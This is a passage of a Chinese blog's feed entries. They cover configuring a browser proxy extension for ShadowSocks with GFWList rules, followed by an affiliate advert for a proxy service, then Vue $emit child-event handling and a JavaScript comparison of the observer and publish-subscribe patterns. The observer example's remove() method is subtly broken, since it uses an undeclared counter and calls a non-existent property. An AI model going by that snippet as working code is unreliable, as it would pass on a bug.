      <link href="/2019/04/f268a7d88a47.html"/>
      <url>/2019/04/f268a7d88a47.html</url>
      
        <content type="html"><![CDATA[<h2 id="代理服务器模式设置"><a href="#代理服务器模式设置" class="headerlink" title="代理服务器模式设置"></a>代理服务器模式设置</h2><p>在该模式下，相当于ShadowSocks的全局模式，浏览的所有网页都会直接走代理；</p><p>点击左侧的proxy选项（没有的话就新建），代理协议选择COCKS5，代理服务器填写为127.0.0.1（默认情况下），代理端口右键自己的ShadowSocks，选择“选项设置”，查看“本地代理”项中的自己本地的端口号。</p><p><img src="http://img.cdn.esunr.xyz/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70" alt=""></p><p><img src="http://img.cdn.esunr.xyz/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70"></p><h2 id="自动切换模式设置"><a href="#自动切换模式设置" class="headerlink" title="自动切换模式设置"></a>自动切换模式设置</h2><p>新加自动切换模式可以实现自动切换，大陆无法访问的网站可以自动切换代理访问，可以正常访问的网站就直接访问。</p><p><img src="http://img.cdn.esunr.xyz/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70" alt=""></p><p>这里进行如下设置，直接引用GFWList的规则，规则列表网址：<a href="https://pagure.io/gfwlist/raw/master/f/gfwlist.txt">https://pagure.io/gfwlist/raw/master/f/gfwlist.txt</a></p><p><img src="http://img.cdn.esunr.xyz/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70" alt="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTI5MjU4MzM=,size_16,color_FFFFFF,t_70"></p><h2 id="服务器推荐"><a href="#服务器推荐" class="headerlink" title="服务器推荐"></a>服务器推荐</h2><p><a href="http://cp.dawangidc.com/aff.php?aff=753">戳我访问</a>（← 请先找个梯子，稳定快速）</p><p>日本、香港、俄罗斯等10+个节点，超低延迟，速度保障</p><p><strong>年付普通1080P套餐仅60元/年，低至5元/月。</strong></p><p><strong>年付尊享4K套餐仅80/年，低至6.6元/月。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对Vue2.2中监听子组件事件的理解</title>
      <link href="/2019/02/852ad8efc37f.html"/>
      <url>/2019/02/852ad8efc37f.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://cn.vuejs.org/v2/guide/components.html#%E7%9B%91%E5%90%AC%E5%AD%90%E7%BB%84%E4%BB%B6%E4%BA%8B%E4%BB%B6">官方文档</a></p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>所谓的 <code>监听子组件事件</code> ，就是当子组件内部触发了一个事件后，外部（也就是调用子组件的父级组件）应该能相应的感知到事件的触发，从而再出发一些列的操作。</p><p>例如：子组件为一个按钮，当按钮被点击时，父级组件会感知，并触发想要触发的操作。</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p><strong>1.设定埋伏，准备捕捉子组件的操作</strong></p><p>我们都知道，<code>v-on</code>操作可以用来监听某些预设好的事件，如input、change、click事件，同时也支持访问自定义的事件。所以，当我们调用已注册的组件，如<code>&lt;blog-post&gt;</code>组件，我们可以用<code>v-on</code>为组件预先绑定一个自定义的事件监听器，只要这个自定义事件被触发了，父级组件就会感知到，触发一个操作。具体的预先设置如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">blog-post</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span></span></span><br><span class="line"><span class="tag">  <span class="attr">v-on:enlarge-text</span>=<span class="string">&quot;postFontSize += 0.1&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由此可见，我们监听的自定义事件命名为<code>enlarge-text</code>，捕捉到事件之后进行的操作为<code>postFontSize += 0.1</code>(postFontSize是Vue示例内部data部分的一个数据)。</p><p><strong>2.子组件进行操作，告知父组件</strong></p><p>我们再第一步设好了埋伏，创建了一个自定义事件，然后我们便需要在子组件中设置这个自定义事件是如何触发的，这里我们用到了<code>$emit</code>。</p><p><code>$emit</code>可以触发一个自定义事件，那么我们只要在子组件中使用<code>$emit(&#39;enlarge-text&#39;)</code>就可以告知父组件<strong>子组件触发了相应的动作</strong>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;blog-post&#x27;, &#123;</span><br><span class="line">  ...</span><br><span class="line">  template: `</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;$emit(&#x27;enlarge-text&#x27;)&quot;</span>&gt;</span></span><br><span class="line">  Enlarge text</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  `</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>如上，当子组件中的按钮被点击时，就触发了<code>$emit(&#39;enlarge-text&#39;)</code>，间接触发了<code>enlarge-text</code>自定义事件，然后触发了父组件调用子组件时设置的<code>v-on:enlarge-text</code>，最终触发了<code>postFontSize += 0.1</code>操作。</p><blockquote><p>Note：要注意<code>$emit</code>只是用来触发一个自定义的事件，这个事件对应外部父组件调用子组件时，对子组件添加的<code>v-on</code>所监听的事件，<code>$emit</code>并不能触发任何函数操作，仅仅如同一个触发器。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript设计模式——观察者模式与发布订阅模式的对比</title>
      <link href="/2019/01/c02de085b779.html"/>
      <url>/2019/01/c02de085b779.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-实现场景"><a href="#1-实现场景" class="headerlink" title="1. 实现场景"></a>1. 实现场景</h1><blockquote><p>分析的例子来源于：<a href="https://www.zhihu.com/question/23486749">https://www.zhihu.com/question/23486749</a> 作者：无邪气</p></blockquote><p>存在有这样一个场景：当在一个数据中心中，用户需要从数据中心中取数据，等待数据中心将数据打包后，用户便可以获取数据。</p><h1 id="2-观察者模式的实现"><a href="#2-观察者模式的实现" class="headerlink" title="2. 观察者模式的实现"></a>2. 观察者模式的实现</h1><h2 id="2-1-UML类图"><a href="#2-1-UML类图" class="headerlink" title="2.1 UML类图"></a>2.1 UML类图</h2><p><img src="http://markdown.img.esunr.xyz/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F.png" alt=""></p><h2 id="2-2-具体实现"><a href="#2-2-具体实现" class="headerlink" title="2.2 具体实现"></a>2.2 具体实现</h2><p>在程序创建了一个任务中心后，再分别创建多个 DownloadTask 即创建多个下载任务，使用 <code>dataHub.addDownloadTask()</code> 来将下载任务添加到任务列表中，那么接下来当任务中心使用 <code>dataHub.notify()</code> 方法传入数据链接后，下载线程就会得到数据链接并实施具体的方法。</p><blockquote><p>客户端不会去主动调用下载线程（观察者）的 <code>finish()</code> 方法，而是交给数据中心（被观察对象）去调用。</p></blockquote><h3 id="2-2-1-创建-DownloadTask-类作为观察者"><a href="#2-2-1-创建-DownloadTask-类作为观察者" class="headerlink" title="2.2.1 创建 DownloadTask 类作为观察者"></a>2.2.1 创建 DownloadTask 类作为观察者</h3><p>DownloadTask类即为该系统中的观察者，观察者有 <code>id</code>、<code>loaded</code>、<code>url</code> 属性，在其上面挂载了一个 <code>finish()</code> 方法，当被观察对象发出指令操作时，这个方法就会被触发。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DownloadTask</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">id</span> = id;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">loaded</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">url</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DownloadTask</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">finish</span> = <span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">url</span> = url;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Task &#x27;</span> + <span class="variable language_">this</span>.<span class="property">id</span> + <span class="string">&#x27; load data from &#x27;</span> + url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-2-创建-DownloadTaskList-类作为管理器"><a href="#2-2-2-创建-DownloadTaskList-类作为管理器" class="headerlink" title="2.2.2 创建 DownloadTaskList 类作为管理器"></a>2.2.2 创建 DownloadTaskList 类作为管理器</h3><p>DownloadTaskList类主要负责提供一个任务队列和一些附加的管理方法，方便管理观察者：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DownloadTaskList</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">downloadTaskList</span> = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DownloadTaskList</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">getCount</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">downloadTaskList</span>.<span class="property">length</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DownloadTaskList</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">get</span> = <span class="keyword">function</span>(<span class="params">index</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">downloadTaskList</span>[index];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DownloadTaskList</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">add</span> = <span class="keyword">function</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">downloadTaskList</span>.<span class="title function_">push</span>(obj);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DownloadTaskList</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">remove</span> = <span class="keyword">function</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> downloadTaskCount = <span class="variable language_">this</span>.<span class="property">downloadTasks</span>.<span class="title function_">getCount</span>();</span><br><span class="line">  <span class="keyword">while</span> (i &lt; downloadTaskCount) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">downloadTaskList</span>[i] === obj) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">downloadTaskList</span>.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-2-3-创建-DataHub-类作为被观察对象"><a href="#2-2-3-创建-DataHub-类作为被观察对象" class="headerlink" title="2.2.3 创建 DataHub 类作为被观察对象"></a>2.2.3 创建 DataHub 类作为被观察对象</h3><p>DataHub类作为被观察对象，被观察对象通知观察者其实现原理就是在 <code>DataHub</code> 类的 <code>notify()</code> 方法中，去遍历数据中心中的下载队列（观察者队列）中的所有任务（观察者），在这些下载任务的实例（观察者）上调用其 <code>finish()</code> 方法，并传入参数 <code>url</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DataHub</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">downloadTasks</span> = <span class="keyword">new</span> <span class="title class_">DownloadTaskList</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DataHub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addDownloadTask</span> = <span class="keyword">function</span>(<span class="params">downloadTask</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">downloadTasks</span>.<span class="title function_">add</span>(downloadTask);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DataHub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">removeDownloadTask</span> = <span class="keyword">function</span>(<span class="params">downloadTask</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">downloadTasks</span>.<span class="title function_">remove</span>(downloadTask);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DataHub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">notify</span> = <span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> downloadTaskCount = <span class="variable language_">this</span>.<span class="property">downloadTasks</span>.<span class="title function_">getCount</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; downloadTaskCount; i++) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">downloadTasks</span>.<span class="title function_">get</span>(i).<span class="title function_">finish</span>(url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-2-4-客户端"><a href="#2-2-4-客户端" class="headerlink" title="2.2.4 客户端"></a>2.2.4 客户端</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个数据中心</span></span><br><span class="line"><span class="keyword">var</span> dataHub = <span class="keyword">new</span> <span class="title class_">DataHub</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在用户来取数据了，创建两个任务</span></span><br><span class="line"><span class="keyword">var</span> downloadTask1 = <span class="keyword">new</span> <span class="title class_">DownloadTask</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> downloadTask2 = <span class="keyword">new</span> <span class="title class_">DownloadTask</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将任务添加到观察者队列中</span></span><br><span class="line">dataHub.<span class="title function_">addDownloadTask</span>(downloadTask1);</span><br><span class="line">dataHub.<span class="title function_">addDownloadTask</span>(downloadTask2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据打包完成了</span></span><br><span class="line">dataHub.<span class="title function_">notify</span>(<span class="string">&#x27;http://somedomain.someaddress&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-2-5-结果"><a href="#3-2-5-结果" class="headerlink" title="3.2.5 结果"></a>3.2.5 结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Task 1 load data from http://somedomain.someaddress</span><br><span class="line">Task 2 load data from http://somedomain.someaddress</span><br></pre></td></tr></table></figure><h1 id="3-发布订阅模式的实现"><a href="#3-发布订阅模式的实现" class="headerlink" title="3. 发布订阅模式的实现"></a>3. 发布订阅模式的实现</h1><h2 id="3-1-UML类图"><a href="#3-1-UML类图" class="headerlink" title="3.1 UML类图"></a>3.1 UML类图</h2><p><img src="http://markdown.img.esunr.xyz/%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.png" alt=""></p><h2 id="3-2-具体实现"><a href="#3-2-具体实现" class="headerlink" title="3.2 具体实现"></a>3.2 具体实现</h2><h3 id="3-2-1-定义-DataHub-类作为发布者"><a href="#3-2-1-定义-DataHub-类作为发布者" class="headerlink" title="3.2.1 定义 DataHub 类作为发布者"></a>3.2.1 定义 DataHub 类作为发布者</h3><p>创建 DataHub 作为事件的发布者，当发布者调用 <code>notify()</code> 方法后，会触发一个回调函数，在这个回调函数中会去调用 DownloadManager 对象下的 <code>publish()</code> 方法，这样就相当于做了一个事件的发布。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DataHub</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DataHub</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">notify</span> = <span class="keyword">function</span>(<span class="params">url, callback</span>) &#123;</span><br><span class="line">  <span class="title function_">callback</span>(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-2-定义-DownloadManager-类作为事件通道"><a href="#3-2-2-定义-DownloadManager-类作为事件通道" class="headerlink" title="3.2.2 定义 DownloadManager 类作为事件通道"></a>3.2.2 定义 DownloadManager 类作为事件通道</h3><p>DownloadManager 对象是发布订阅模式中的数据处理中心，它负责了事件的订阅与发布，包括处理发布的消息数据。</p><p>DownloadManager 类中有两个属性，一个是 <code>events</code> 存放了订阅事件以及对应事件的订阅者，<code>uId</code> 作为计数器，记录订阅者的ID。</p><p>其中，<code>events</code> 的结构为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123; </span><br><span class="line">  <span class="string">&quot;订阅事件1&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">taskId</span>: <span class="title class_">Number</span>, <span class="attr">handler</span>: <span class="title class_">Function</span>&#125;, <span class="comment">// 订阅者1_1</span></span><br><span class="line">    &#123;<span class="attr">taskId</span>: <span class="title class_">Number</span>, <span class="attr">handler</span>: <span class="title class_">Function</span>&#125;, <span class="comment">// 订阅者1_2</span></span><br><span class="line">  ], </span><br><span class="line">  <span class="string">&quot;订阅事件2&quot;</span>: [</span><br><span class="line">    &#123;<span class="attr">taskId</span>: <span class="title class_">Number</span>, <span class="attr">handler</span>: <span class="title class_">Function</span>&#125;, <span class="comment">// 订阅者2_1</span></span><br><span class="line">    &#123;<span class="attr">taskId</span>: <span class="title class_">Number</span>, <span class="attr">handler</span>: <span class="title class_">Function</span>&#125;, <span class="comment">// 订阅者2_2</span></span><br><span class="line">  ]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">DownloadManager</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">events</span> = &#123;&#125;;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">uId</span> = -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 DownloadManager 的追加一个 publish 方法函数，用来给发布者发布某一事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发布</span></span><br><span class="line"><span class="title class_">DownloadManager</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">publish</span> = <span class="keyword">function</span>(<span class="params">eventType, url</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">events</span>[eventType]) &#123;</span><br><span class="line">    <span class="comment">// 判断是否有订阅者订阅该事件,</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">var</span> subscribers = <span class="variable language_">this</span>.<span class="property">events</span>[eventType],</span><br><span class="line">    count = subscribers ? subscribers.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 循环遍历订阅事件队列中的订阅者</span></span><br><span class="line">  <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">    <span class="keyword">var</span> subscriber = subscribers[count];</span><br><span class="line">    subscriber.<span class="title function_">handler</span>(eventType, subscriber.<span class="property">taskId</span>, url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 DownloadManager 的追加一个 subscribe 方法函数，用来给订阅者订阅某一事件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 订阅</span></span><br><span class="line"><span class="title class_">DownloadManager</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">subscribe</span> = <span class="keyword">function</span>(<span class="params">eventType, handler</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">events</span>[eventType]) &#123;</span><br><span class="line">    <span class="comment">// 如果订阅的事件不存在，就在 events 对象中创建一个，让其值为一个空数组，用来存放订阅该事件的订阅者</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">events</span>[eventType] = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> taskId = (++<span class="variable language_">this</span>.<span class="property">uId</span>).<span class="title function_">toString</span>();</span><br><span class="line">  <span class="comment">// 将该订阅者放入对应的事件的订阅者队列中</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">events</span>[eventType].<span class="title function_">push</span>(&#123;</span><br><span class="line">    <span class="attr">taskId</span>: taskId,</span><br><span class="line">    <span class="attr">handler</span>: handler</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> taskId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-3-客户端函数"><a href="#3-2-3-客户端函数" class="headerlink" title="3.2.3 客户端函数"></a>3.2.3 客户端函数</h3><p>客户端一定要遵循先设置订阅，后设置发布的原则。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个数据中心</span></span><br><span class="line"><span class="keyword">var</span> dataHub = <span class="keyword">new</span> <span class="title class_">DataHub</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个下载事件管理器</span></span><br><span class="line"><span class="keyword">var</span> downloadManager = <span class="keyword">new</span> <span class="title class_">DownloadManager</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个下载器</span></span><br><span class="line"><span class="keyword">var</span> dataLoader = <span class="keyword">function</span>(<span class="params">eventType, taskId, url</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Task &#x27;</span> + taskId + <span class="string">&#x27; load data from &#x27;</span> + url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用户来请求数据了，从 downloadManager 订阅事件</span></span><br><span class="line"><span class="keyword">var</span> downloadTask1 = downloadManager.<span class="title function_">subscribe</span>(<span class="string">&#x27;dataReady&#x27;</span>, dataLoader);</span><br><span class="line"><span class="keyword">var</span> downloadTask2 = downloadManager.<span class="title function_">subscribe</span>(<span class="string">&#x27;dataReady2&#x27;</span>, dataLoader);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据打包完成了</span></span><br><span class="line">dataHub.<span class="title function_">notify</span>(<span class="string">&#x27;http://somedomain.someaddress&#x27;</span>, <span class="keyword">function</span>(<span class="params">url</span>)&#123;</span><br><span class="line">  <span class="comment">// 向 downloadManager 发布一个事件</span></span><br><span class="line">  downloadManager.<span class="title function_">publish</span>(<span class="string">&#x27;dataReady&#x27;</span>, url);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">dataHub.<span class="title function_">notify</span>(<span class="string">&#x27;http://somedomain2.someaddress&#x27;</span>, <span class="keyword">function</span>(<span class="params">url</span>)&#123;</span><br><span class="line">  <span class="comment">// 向 downloadManager 发布一个事件</span></span><br><span class="line">  downloadManager.<span class="title function_">publish</span>(<span class="string">&#x27;dataReady2&#x27;</span>, url);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="3-2-4-结果"><a href="#3-2-4-结果" class="headerlink" title="3.2.4 结果"></a>3.2.4 结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Task 0 load data from http://somedomain.someaddress</span><br><span class="line">Task 1 load data from http://somedomain2.someaddress</span><br></pre></td></tr></table></figure><h1 id="4-区别"><a href="#4-区别" class="headerlink" title="4. 区别"></a>4. 区别</h1><p>观察者模式不需要中间件，被观察对象可以直接将事件通知给观察者。</p><p>然而发布订阅模式，则需要一个中间的发布订阅管理器，来进行发布事件与订阅事件的详细方法实现。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将本地项目托管到Github上，以及将Github上的项目同步到本地</title>
      <link href="/2018/12/c1cb569e511d.html"/>
      <url>/2018/12/c1cb569e511d.html</url>
      
